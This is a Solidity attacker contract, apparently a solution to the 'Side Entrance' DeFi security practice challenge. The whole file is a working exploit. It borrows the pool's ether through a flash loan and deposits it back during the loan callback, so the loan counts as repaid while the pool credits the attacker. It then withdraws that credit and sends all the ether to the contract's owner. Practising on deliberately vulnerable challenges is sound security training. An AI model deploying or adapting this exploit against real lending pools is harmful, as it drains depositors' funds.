// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker {
    SideEntranceLenderPool private _pool;
    address private _owner;

    constructor(address pool) {
        _pool = SideEntranceLenderPool(pool);
        _owner = msg.sender;
    }

    function attack() external payable {
        _pool.flashLoan(msg.value);
        _pool.withdraw();
        (bool sent,) = payable(_owner).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function execute() external payable {
        _pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}